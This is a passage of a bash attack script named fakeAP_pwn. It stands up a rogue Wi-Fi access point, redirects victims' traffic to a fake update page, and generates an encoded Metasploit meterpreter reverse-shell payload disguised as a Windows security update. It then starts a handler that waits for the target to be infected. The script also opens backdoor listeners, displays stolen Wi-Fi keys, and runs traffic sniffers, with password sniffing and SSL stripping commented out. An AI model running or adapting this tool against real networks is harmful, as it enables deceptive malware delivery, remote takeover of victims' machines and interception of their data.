		Order allow,deny
		allow from all
	</Directory>
	ErrorLog /var/log/apache2/fakeAP_pwn-error.log
	LogLevel warn
	CustomLog /var/log/apache2/fakeAP_pwn-access.log combined
        ErrorDocument 403 /index.php
        ErrorDocument 404 /index.php
</VirtualHost>
<IfModule mod_ssl.c>
<VirtualHost _default_:443>
	ServerAdmin webmaster@localhost
	DocumentRoot $htdocsPath
	ServerName \"10.0.0.1\"
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory $htdocsPath>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>
	ErrorLog /var/log/apache2/error.log
	LogLevel warn
	CustomLog /var/log/apache2/ssl_fakeAP_pwn-access.log combined
        ErrorDocument 403 /index.php
        ErrorDocument 404 /index.php
	SSLEngine on
	SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
	SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
	<FilesMatch \"\.(cgi|shtml|phtml|php)$\">
		SSLOptions +StdEnvVars
	</FilesMatch>
	<Directory /usr/lib/cgi-bin>
		SSLOptions +StdEnvVars
	</Directory>
	BrowserMatch \"MSIE [2-6]\" \
		nokeepalive ssl-unclean-shutdown \
		downgrade-1.0 force-response-1.0
	BrowserMatch \"MSIE [17-9]\" ssl-unclean-shutdown
</VirtualHost>
</IfModule>" > /etc/apache2/sites-available/fakeAP_pwn
if [ "$verbose" == "2" ] ; then echo "Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
if [ "$debug" == "true" ]; then cat /etc/apache2/sites-available/fakeAP_pwn; fi

#----------------------------------------------------------------------------------------------#
if [ "$apMode" != "normal" ]; then
   #echo -e "\e[01;32m[>]\e[00m Creating exploit.(Linux)"
   #if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb"; fi
   #xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb"
   #echo -e "\e[01;32m[>]\e[00m Creating exploit..(OSX)"
   #if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin"; fi
   #xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "$metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin"
   echo -e "\e[01;32m[>]\e[00m Creating exploit...(Windows)"
   #if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
   #$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocsPath/Windows-KB183905-x86-ENU.exe"
   #if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
   #$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"
   command="$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"
   if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   $xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$command"
   #if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x64-ENU.exe"; fi
   #$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x64-ENU.exe"
fi

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Creating fake access point..."
command="airbase-ng $monitorInterface -a $macAddress -W 0 -y -c $fakeAPchannel -e \"$ESSID\""
if [ "$respond2All" == "true" ]; then command="$command -P -C 60"; fi
if [ "$debug" == "true" ] || [ "$verbose" != "0" ]; then command="$command -v"; fi
if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
$xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "$command" &
sleep 3

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Setting up our end..."
# IP Tables - Fordwarding traffic....
ifconfig lo up                                                                     # Make sure localhost is up
ifconfig at0 up                                                                    # The new FakeAP interface
command=$(ifconfig -a | grep at0 | awk '{print $1}')
if [ "$command" != "at0" ]; then
   echo -e "\e[00;31m[-]\e[00m Couldn't create the fake access point." 1>&2
   cleanup
fi
ifconfig at0 10.0.0.1 netmask 255.255.255.0                                        # Sets IP Address
ifconfig at0 mtu $mtu                                                              # Changes MTU for FakeAP
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1                          # Sets gateway for FakeAP
iptables --flush                                                                   # Clear any existing stuff before we start
iptables --table nat --flush                                                       # Clear any existing stuff before we start
iptables --delete-chain                                                            # Delete all chains that are not in default filter and nat table
iptables --table nat --delete-chain                                                # Delete all chains that are not in default filter and nat table
echo "1" > /proc/sys/net/ipv4/ip_forward                                           # Enables packet forwarding via kernel
command=`cat /proc/sys/net/ipv4/ip_forward`
if [ $command != "1" ]; then
  echo -e "\e[00;31m[-]\e[00m Can't enable ip_forward" 1>&2
  cleanup
fi
if [ "$apMode" == "normal" ]; then
   iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE   # ...and send it on to the internet (for now, we will redirct later (once we are ready!))
   iptables --append FORWARD --in-interface at0 --jump ACCEPT                              # Get everything on the fakeAP # Allow at0 interface connections to be forwarded through other interfaces
   iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP         # Change destination addresses to the connection with internet
elif [ "$apMode" == "transparent" ] || [ "$apMode" == "non" ]; then
   iptables --table nat --append PREROUTING --in-interface at0 --jump REDIRECT                       # Blackhole Routing - will redirect all network traffic on the AP interface back to the system. (cache)
   #iptables --table nat --append PREROUTING --proto tcp --jump DNAT --to-destination 64.111.96.38    # Blackhole Routing - Send everything to that IP address
fi
# DHCP
if [ "$verbose" == "2" ] ; then echo "Command: chmod 775 /var/run/"; fi
$xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "chmod 775 /var/run/"
if [ "$verbose" == "2" ] ; then echo "Command: touch /var/lib/dhcp3/dhcpd.leases"; fi
$xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "touch /var/lib/dhcp3/dhcpd.leases"

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Starting DHCP server..."
if [ "$verbose" == "2" ] ;
 then echo "Command: dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0"; fi
$xterm -geometry 75x3+10+75 -T "fakeAP_pwn v$version - DHCP server" -e "dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0" & # -d = logging, -f = forground
sleep 2
if [ -z "$(pgrep dhcpd3)" ]; then # check if dhcpd3 server is running
   echo -e "\e[00;31m[-]\e[00m DHCP server failed to start." 1>&2
   if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ "$apMode" != "normal" ]; then
   echo -e "\e[01;32m[>]\e[00m Starting Metasploit..."
   #if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
   #if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "$metasploitPath/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
   if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb E"; fi
   $xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb E" &
   sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download...
   if [ -z "$(pgrep ruby)" ]; then
      echo -e "\e[00;31m[-]\e[00m Metaspliot failed to start." 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi
      cleanup
   fi

#----------------------------------------------------------------------------------------------#
   echo -e "\e[01;32m[>]\e[00m Starting Web server..."
   if [ "$verbose" == "2" ] ; then echo "Command: /etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && /etc/init.d/apache2 reload"; fi
   $xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one
   sleep 2
   if [ -z "$(pgrep apache2)" ]; then
      echo -e "\e[00;31m[-]\e[00m Apache2 failed to start." 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi
      cleanup
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "vnc" ]; then
      echo -e "\e[01;32m[>]\e[00m Getting the backdoor (VNC) ready..."
      if [ "$verbose" == "2" ] ; then echo "Command: vncviewer -listen"; fi
      $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - VNC" -e "vncviewer -listen" &
   elif [ "$payload" == "sbd" ]; then
      echo -e "\e[01;32m[>]\e[00m Getting the backdoor (SBD) ready..."
      if [ "$verbose" == "2" ]; then echo "Command: sbd -l -k g0tmi1k -p $port"; fi
      $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - SBD" -e "sbd -l -k g0tmi1k -p $port" &
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
   if [ "$debug" == "true" ] || [ "$verbose" == "2" ]; then
      command="watch -d -n 3 \"arp -n -v -i at0\""
      if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
      $xterm -geometry 75x22+100+440 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
   fi
   echo -e "\e[01;33m[*]\e[00m Waiting for target to run the \"update\""
   if test -e /tmp/fakeAP_pwn.lock; then rm -r /tmp/fakeAP_pwn.lock; fi
   while [ ! -e /tmp/fakeAP_pwn.lock ]; do
      sleep 5
   done

#----------------------------------------------------------------------------------------------#
   echo -e "\e[01;33m[+]\e[00m Target infected!"
   targetIP=$(arp -n -v -i at0 | awk '/at0/' | awk -F " " '{print $1}')
   if [ "$verbose" != "0" ]; then echo -e "\e[01;33m[i]\e[00m Target's IP = $targetIP"; fi

#----------------------------------------------------------------------------------------------#
   if [ "$apMode" == "true" ]; then
      echo -e "\e[01;32m[>]\e[00m Give our target their inter-webs back..."
      iptables --flush
      iptables --table nat --flush
      iptables --delete-chain
      iptables --table nat --delete-chain
      echo "1" > /proc/sys/net/ipv4/ip_forward
      command=`cat /proc/sys/net/ipv4/ip_forward`
      if [ $command != "1" ]; then
        echo -e "\e[00;31m[-]\e[00m Can't enable ip_forward" 1>&2
        cleanup
      fi
      iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
      iptables --append FORWARD --in-interface at0 -j ACCEPT
      iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "wkv" ]; then
      echo -e "\e[01;32m[>]\e[00m Opening WiFi Keys..."
      xterm -hold -geometry 130x22+10+440 -T "fakeAP_pwn v$version - WiFi Keys" -e "cat /tmp/fakeAP_pwn.wkv" & # Don't close! We want to view this!
      sleep 1
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$extras" == "true" ]; then
   echo -e "\e[01;32m[>]\e[00m Caputuring infomation about the target..."
   command="urlsnarf -i at0"
   if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   $xterm -geometry 75x10+10+0    -T "fakeAP_pwn v$version - URLs" -e "$command" &          # URLs
   #command="dsniff -i at0"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   #$xterm -geometry 75x10+10+155  -T "fakeAP_pwn v$version - Passwords" -e "$command" &     # Passwords
   #command="ettercap -T -q -p -i at0 // //"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   #$xterm -geometry 75x10+460+155 -T "fakeAP_pwn v$version - Passwords (2)" -e "$command" & # Passwords (again)
   #command="msgsnarf -i at0"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM" -e "$command" &            # IM
   #command="imsniff at0"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM (2)" -e "$command" &       # IM (again)
   command="driftnet -i at0"
   if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   $xterm -geometry 75x10+10+465  -T "fakeAP_pwn v$version - Images" -e "$command" &        # Images
   command="tcpdump -i at0 -w /tmp/fakeAP_pwn.cap"
   #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
   #command="sslstrip -k -f -l 10000"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "$command" &           # SSLStrip
   if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
   $xterm -geometry 100x10+650+640 -T "fakeAP_pwn v$version - tcpdump" -e "$command" &       # Dump all trafic to a .cap file
fi

#----------------------------------------------------------------------------------------------#
if [ "$apMode" == "normal" ]; then
   if [ "$debug" == "true" ] || [ "$verbose" == "2" ]; then
      command="watch -d -n 3 \"arp -n -v -i at0\""
      if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
      $xterm -geometry 75x22+100+440 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
   fi
   echo -e "\e[01;33m[*]\e[00m Ready! ...press CTRL+C to stop"
   for (( ; ; ))
   do
      sleep 1
   done
fi

#----------------------------------------------------------------------------------------------#
cleanup clean
